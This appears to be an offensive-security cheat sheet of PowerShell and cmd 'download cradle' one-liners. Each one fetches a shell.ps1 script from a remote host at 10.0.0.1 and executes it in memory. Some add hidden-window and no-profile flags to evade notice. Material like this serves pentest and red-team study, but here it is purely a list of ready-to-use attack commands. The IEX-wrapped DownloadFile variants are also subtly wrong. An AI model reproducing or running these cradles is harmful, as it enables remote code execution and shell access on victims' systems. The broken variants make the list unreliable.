## Download Cradles

### PowerShell
`IEX(iwr 'http://10.0.0.1/shell.ps1')`<br>
`IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')`<br>
`IEX(New-Object Net.WebClient).DownloadFile('http://10.0.0.1/shell.ps1','shell.ps1')`<br>

### cmd
`powershell.exe -nop -w hidden -c "IEX(iwr 'http://10.0.0.1/shell.ps1')"`<br>
`powershell.exe -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1'))"`<br>
`powershell.exe -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadFile('http://10.0.0.1/shell.ps1','shell.ps1'))"`<br>

